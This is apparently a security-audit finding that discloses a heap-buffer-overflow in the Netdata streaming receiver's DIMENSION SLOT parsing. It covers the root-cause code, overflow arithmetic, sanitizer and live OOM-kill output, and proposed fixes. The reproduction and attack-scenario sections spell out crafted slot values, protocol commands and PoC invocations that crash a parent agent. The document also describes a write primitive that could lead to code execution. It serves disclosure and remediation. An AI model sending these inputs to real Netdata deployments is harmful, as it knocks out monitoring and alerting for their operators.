# Authenticated Remote Heap Corruption in Netdata Streaming `DIMENSION SLOT`

**Severity:** Critical (authenticated remote heap-buffer-overflow; confirmed DoS; plausible RCE)  
**Component:** Streaming receiver — pluginsd protocol parser  
**Affected versions:** All versions containing `pluginsd_rrddim_put_to_slot()` without an upper-bound check on the dimension slot, confirmed present in v2.10.0-289-nightly (commit `4b4599484`)  
**Precondition:** Valid streaming API key (`[API_KEY] enabled = yes` in `stream.conf`)

---

## Summary

A streaming child with a valid API key can send a `DIMENSION SLOT:<value>` command where the slot value is a crafted 64-bit integer. The parent agent passes this value directly as an allocation count without bounds checking or overflow detection. The multiplication `slot * sizeof(struct pluginsd_rrddim)` overflows `size_t`, causing `callocz()` to allocate a tiny buffer while the code stores the original huge value as the logical array size. The subsequent initialization loop writes past the end of the tiny allocation, corrupting adjacent heap memory.

**Confirmed impact:**
- Heap-buffer-overflow (validated with AddressSanitizer against exact code arithmetic)
- Adjacent heap object corruption (validated: sentinel values zeroed before SIGSEGV)
- **Parent process crash / denial of service — confirmed live against Netdata v2.10.0-289-nightly** (OOM-kill, memory peak 3.4 GB, process terminated 29 seconds after exploit delivery)

**Unproven impact:**
- Reliable end-to-end RCE against a running Netdata parent has not been demonstrated
- Heap grooming through the streaming protocol was not demonstrated against the real allocator
- ASLR bypass was not demonstrated

---

## Affected Code

| File | Line | Symbol |
|------|------|--------|
| `src/plugins.d/pluginsd_internals.h` | 372 | `pluginsd_parse_rrd_slot()` — parses slot, no upper bound |
| `src/plugins.d/pluginsd_internals.h` | 159 | `pluginsd_rrddim_put_to_slot()` — uses slot as allocation count |
| `src/database/rrdset-pluginsd-array.h` | 51 | `prd_array_create()` — overflowing multiplication |
| `src/plugins.d/pluginsd_parser.c` | 572 | `pluginsd_dimension()` — calls put_to_slot with raw slot |
| `src/plugins.d/gperf-config.txt` | 82 | `DIMENSION` registered with `PARSER_INIT_STREAMING` |
| `src/streaming/stream-receiver.c` | 471 | receiver parser initialized with `PARSER_INIT_STREAMING` |

---

## Root Cause

### 1. Unbounded slot parsing

`pluginsd_parse_rrd_slot()` reads the `SLOT:` value via `str2ull_encoded()`, which accepts the full 64-bit range. Only negative values are clamped to zero. There is no upper bound:

```c
// src/plugins.d/pluginsd_internals.h:372
static ALWAYS_INLINE ssize_t pluginsd_parse_rrd_slot(char **words, size_t num_words) {
    ssize_t slot = -1;
    char *id = get_word(words, num_words, 1);
    if(id && id[0] == PLUGINSD_KEYWORD_SLOT[0] && ... && id[4] == ':') {
        slot = (ssize_t) str2ull_encoded(&id[5]);
        if(slot < 0) slot = 0;   // only clamp: negatives
    }
    return slot;
}
```

### 2. Slot used as allocation count without overflow check

`pluginsd_rrddim_put_to_slot()` casts the slot directly to `size_t` and passes it to `prd_array_create()`:

```c
// src/plugins.d/pluginsd_internals.h:159
static inline void pluginsd_rrddim_put_to_slot(..., ssize_t slot, ...) {
    size_t wanted_size;
    if(slot >= 1) {
        wanted_size = (size_t)slot;   // attacker-controlled, no upper bound
    }
    ...
    if(wanted_size > current_size) {
        PRD_ARRAY *new_arr = prd_array_create(wanted_size);
        ...
        for(size_t i = current_size; i < wanted_size; i++) {
            new_arr->entries[i].rda = NULL;   // writes past tiny allocation
            new_arr->entries[i].rd  = NULL;
            new_arr->entries[i].id  = NULL;
        }
    }
}
```

### 3. Integer overflow in allocation

`prd_array_create()` computes the allocation size with an unchecked multiplication:

```c
// src/database/rrdset-pluginsd-array.h:51
static inline PRD_ARRAY *prd_array_create(size_t size) {
    PRD_ARRAY *arr = callocz(1, sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim));
    //                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //                                              size * 24 overflows size_t for large size
    arr->size = size;   // stores the original huge value as logical size
    return arr;
}
```

`sizeof(struct pluginsd_rrddim) = 24` (three pointers on 64-bit). For `size = 0x0AAAAAAAAAAAAAAB`:

```
size * 24 mod 2^64 = 8
sizeof(PRD_ARRAY) + 8 = 24   →   calloc allocates 24 bytes
arr->size = 768614336404564651   →   init loop bound is 7.7 × 10^17
```

The init loop immediately writes past the 24-byte allocation.

### 4. Comparison with the chart-slot path

The sibling function `pluginsd_rrdset_cache_put_to_slot()` (same file, line 388) explicitly rejects oversized slots:

```c
if(unlikely(slot < 1 || slot >= INT32_MAX))
    return;
```

The dimension-slot path has no equivalent guard. This is the missing check.

### 5. Reachability from the network

- `DIMENSION` is registered with `PARSER_INIT_STREAMING` (`gperf-config.txt:82`).
- The streaming receiver initializes its parser with `PARSER_INIT_STREAMING` (`stream-receiver.c:471`).
- `parser_execute()` dispatches `DIMENSION` directly to `pluginsd_dimension()` with no additional state gate.
- The `SLOT:` token is parsed regardless of whether `STREAM_CAP_SLOTS` was negotiated — the parser acts on wire text only.
- A chart scope must be established first (via `CHART`), which is also in `PARSER_INIT_STREAMING`.

The full network path is: TCP connect → streaming handshake → `CHART` → `DIMENSION SLOT:<value>`.

---

## Overflow Arithmetic

`sizeof(PRD_ARRAY) = 16`, `sizeof(struct pluginsd_rrddim) = 24` on 64-bit Linux x86-64.

| Slot value | `calloc` size (bytes) | `arr->size` (logical) | Effect |
|---|---|---|---|
| `0x0AAAAAAAAAAAAAAB` | 24 | 7.69 × 10^17 | Overflow → tiny alloc, huge loop bound |
| `0x0AAAAAAAAAAAAAAC` | 48 | 7.69 × 10^17 | Overflow → tiny alloc, huge loop bound |
| `0x40000000` | 25,769,803,792 | 1,073,741,824 | No overflow → ~25 GB request → `fatal()` |

Verified by `poc/calc_overflow.c`.

---

## Validated Impact

### Heap-buffer-overflow (AddressSanitizer)

`poc/poc_prd_overflow.c` reproduces the exact arithmetic and initialization loop from the codebase. Compiled with `-fsanitize=address`:

```
$ gcc -O0 -g -fsanitize=address -o poc_prd_overflow poc/poc_prd_overflow.c
$ ./poc_prd_overflow 0x0AAAAAAAAAAAAAAB

[*] prd_array_create(size=768614336404564651): requesting 24 bytes (calloc)
[*] allocated 24 real bytes but arr->size=768614336404564651 (entries claimed)
[*] entering init loop: for(i=0; i<768614336404564651; i++) ...

=================================================================
ERROR: AddressSanitizer: heap-buffer-overflow on address 0x503000000058
WRITE of size 8 at 0x503000000058 thread T0
    #0 in put_to_slot poc_prd_overflow.c:85
0x503000000058 is located 0 bytes after 24-byte region [0x503000000040,0x503000000058)
allocated by thread T0 here:
    #1 in prd_array_create poc_prd_overflow.c:46
```

The write occurs at the first loop iteration, immediately past the 24-byte allocation.

### Adjacent heap object corruption

`poc/poc_heap_corruption.c` places a sentinel object on the heap after the undersized array, runs the real initialization loop, catches the eventual SIGSEGV, and reads back the sentinel:

```
$ gcc -O0 -g -o poc_heap_corruption poc/poc_heap_corruption.c
$ ./poc_heap_corruption 0x0AAAAAAAAAAAAAAB

[*] victim BEFORE: magic=0xdeadbeefcafef00d fnptr=0x4141414142424242 name='callback_obj'
[*] running real init loop: for(i=0;i<768614336404564651;i++) entries[i]={NULL,NULL,NULL}
[*] caught SIGSEGV: the loop ran off the end of the heap (wild write)
[*] victim AFTER : magic=0x0000000000000000 fnptr=(nil) name=''

[+] HEAP CORRUPTION CONFIRMED: adjacent object fully zeroed by the overflow.
    - victim->fnptr was 0x4141414142424242, now NULL.
```

The initialization loop writes NULL sequentially across the heap, zeroing whatever objects follow the undersized allocation before hitting an unmapped page.

### Parent process crash (DoS) — live reproduction

Two crash classes exist:

**Class 1 — Overflow slot:** The initialization loop writes past the tiny allocation and eventually hits an unmapped page → SIGSEGV → parent process terminates.

**Class 2 — Large non-overflowing slot:** `slot = 0x40000000` requests ~25 GB. Netdata's `callocz()` calls `fatal()` on allocation failure, or the OS OOM-killer terminates the process.

**Class 2 was reproduced against a live Netdata parent (v2.10.0-289-nightly):**

Before the exploit:
```
● netdata.service
   Active: active (running) since Fri 2026-05-29 15:45:38 UTC; 5s ago
   Main PID: 6744 (netdata)
   Memory: 180.6M (peak: 180.6M)
   CPU: 2.126s
```

After sending `DIMENSION SLOT:0x40000000` via `poc_stream_dimension_slot.py`:
```
● netdata.service
   Active: deactivating (final-sigterm) (Result: oom-kill)
   Process: 6744 ExecStart=... (code=killed, signal=KILL)
   Memory: 132.7M (peak: 3.4G)
   CPU: 10.607s
```

The parent process was killed by the OOM killer after its memory peaked at **3.4 GB** (the agent attempted to allocate ~25 GB for the dimension cache array). The process was running for 29 seconds total (15:45:38 → 15:46:07). This is a **confirmed, live remote DoS** against a real Netdata parent with a valid streaming API key.

---

## Unproven Impact

### Why RCE is plausible but not demonstrated

The initialization loop writes NULL values sequentially. NULL overwrites can corrupt heap metadata (glibc chunk headers) or zero function pointers in adjacent objects, but:

- NULL is not an attacker-chosen value. Exploiting a NULL overwrite for code execution requires specific heap layout conditions.
- The loop crashes (SIGSEGV) before completing, so only objects within the first few pages after the chunk are reliably zeroed.
- No heap grooming technique was demonstrated through the streaming protocol to position a specific target object at a predictable offset.
- ASLR was not bypassed.

A second write primitive exists: after the overflowed array is published with a huge `arr->size`, subsequent `DIMENSION` calls with small slot values pass the `slot <= arr->size` check and write `prd->rda`, `prd->rd`, `prd->id` (real heap pointers and an attacker-controlled id string pointer) at offset `(slot-1)*24` from the entries base. This is a more controlled write, but:

- It requires the overflowed array to survive in `st->pluginsd.prd_array` after the initialization loop crash. In practice the crash terminates the process before the array is published.
- Demonstrating this path requires either preventing the crash (e.g., by catching SIGSEGV in the agent, which it does not do) or finding a slot value where the initialization loop terminates without crashing (not found for the overflow class).

`poc/poc_rce_primitive.c` demonstrates the second write primitive in a standalone harness where the initialization loop is intentionally skipped. It shows function pointer overwrite and attacker code execution in that controlled model. This is evidence of a strong exploitation primitive, not a demonstration of end-to-end RCE against the real agent.

---

## Reproduction Steps

### Prerequisites

- `gcc` with optional `-fsanitize=address`
- For network reproduction: a lab Netdata parent on loopback with a throwaway API key

### Step 1 — Verify overflow arithmetic

```bash
gcc -O0 -o calc_overflow poc/calc_overflow.c
./calc_overflow
```

Expected: slot `0x0AAAAAAAAAAAAAAB` → 24-byte allocation, `arr->size` = 768614336404564651.

### Step 2 — ASan heap-buffer-overflow

```bash
gcc -O0 -g -fsanitize=address -o poc_prd_overflow poc/poc_prd_overflow.c
./poc_prd_overflow 0x0AAAAAAAAAAAAAAB
```

Expected: `ERROR: AddressSanitizer: heap-buffer-overflow` on the first write past the 24-byte allocation.

### Step 3 — Adjacent object corruption

```bash
gcc -O0 -g -o poc_heap_corruption poc/poc_heap_corruption.c
./poc_heap_corruption 0x0AAAAAAAAAAAAAAB
```

Expected: `HEAP CORRUPTION CONFIRMED` — sentinel values zeroed before SIGSEGV.

### Step 4 — Network reproduction (lab only)

Configure a lab parent with a throwaway key allowing only loopback:

```ini
[<LAB_KEY_UUID>]
    type = api
    enabled = yes
    allow from = 127.0.0.1
```

Run the streaming PoC:

```bash
python3 poc/poc_stream_dimension_slot.py 127.0.0.1 19999 <LAB_KEY_UUID> 0x0AAAAAAAAAAAAAAB
```

Expected: parent process terminates (SIGSEGV or heap allocator abort). Verify with `journalctl -u netdata` or `coredumpctl`.

For the DoS-only class:

```bash
python3 poc/poc_stream_dimension_slot.py 127.0.0.1 19999 <LAB_KEY_UUID> 0x40000000
```

Expected result — confirmed live against Netdata v2.10.0-289-nightly:

```
● netdata.service
   Active: deactivating (final-sigterm) (Result: oom-kill)
   Process: <PID> ExecStart=... (code=killed, signal=KILL)
   Memory: ~130M (peak: 3.4G)
   CPU: ~10s
```

The parent attempts to allocate ~25 GB for the dimension cache array. The OOM killer terminates the process. Memory peaks at 3.4 GB before the kill signal is delivered.

---

## Attack Scenario

This vulnerability is in the **parent ← child trust boundary** of a Netdata streaming deployment. The parent trusts that a child sending data over the streaming protocol is a legitimate Netdata agent. The slot value is part of a performance optimization (dimension cache indexing) that the parent accepts from the child without validating its magnitude.

**Who can trigger this:**

1. **Compromised child host** — an attacker who has compromised any host running a Netdata child that streams to the target parent. The child's API key is already configured and valid.
2. **Insider with streaming credentials** — anyone who has access to a valid `[API_KEY]` UUID from `stream.conf`.
3. **Misconfigured `allow from = *`** — if the parent accepts streaming connections from any IP, an attacker who can reach port 19999 and knows or guesses the API key UUID can connect directly.

**What the attacker does:**

1. Connect to the parent's TCP port 19999.
2. Complete the streaming handshake with a valid API key.
3. Send `CHART evil.chart '' 'x' 'x' 'x' 'x' '' 1000 1 '' '' ''` to establish a chart scope.
4. Send `DIMENSION SLOT:0x0AAAAAAAAAAAAAAB d1 'd1' absolute 1 1 ''`.
5. The parent's streaming receiver thread crashes.

**Operational impact:**

- Parent `netdata` process terminates.
- All streaming children appear offline until the parent restarts.
- Alert evaluation stops for the duration of the outage.
- If the parent is managed by systemd and the malicious child reconnects immediately, the parent enters a restart loop.

---

## Remediation

### Fix 1 — Bound the dimension slot (primary fix)

In `pluginsd_rrddim_put_to_slot()`, add an upper-bound check mirroring the chart-slot path:

```c
// src/plugins.d/pluginsd_internals.h
static inline void pluginsd_rrddim_put_to_slot(..., ssize_t slot, ...) {
    size_t wanted_size;
    if(slot >= 1) {
        if(unlikely(slot >= INT32_MAX)) {   // mirror pluginsd_rrdset_cache_put_to_slot()
            netdata_log_error("PLUGINSD: dimension slot %zd out of range, ignoring", slot);
            return;
        }
        wanted_size = (size_t)slot;
    }
    ...
}
```

### Fix 2 — Overflow-safe allocation (defense in depth)

In `prd_array_create()`, detect multiplication overflow before calling `callocz()`:

```c
// src/database/rrdset-pluginsd-array.h
static inline PRD_ARRAY *prd_array_create(size_t size) {
    size_t entries_bytes, total_bytes;
    if (__builtin_mul_overflow(size, sizeof(struct pluginsd_rrddim), &entries_bytes) ||
        __builtin_add_overflow(sizeof(PRD_ARRAY), entries_bytes, &total_bytes)) {
        netdata_log_error("PRD_ARRAY: allocation size overflow for size=%zu", size);
        return NULL;   // caller must handle NULL
    }
    PRD_ARRAY *arr = callocz(1, total_bytes);
    arr->refcount = 1;
    arr->size = size;
    rrd_slot_memory_added(total_bytes);
    return arr;
}
```

### Fix 3 — Regression test

Add a unit test that sends overflow-class and large-non-overflowing slot values through the parser and verifies they are rejected without crashing.

---

## Files

```
security-audit/
├── DIMENSION-SLOT-FINDING.md   ← this document
├── REPORT.md                   ← full audit report (all findings)
├── NOTES.md                    ← audit working notes
└── poc/
    ├── poc_prd_overflow.c          ASan heap-buffer-overflow reproduction
    ├── poc_heap_corruption.c       Adjacent heap object corruption proof
    ├── poc_rce_primitive.c         Controlled-write primitive (standalone model)
    ├── poc_stream_dimension_slot.py  Network-level streaming PoC
    ├── calc_overflow.c             Overflow arithmetic verification
    └── calc_targeted_write.c       Write-offset computation for overflow slots
```
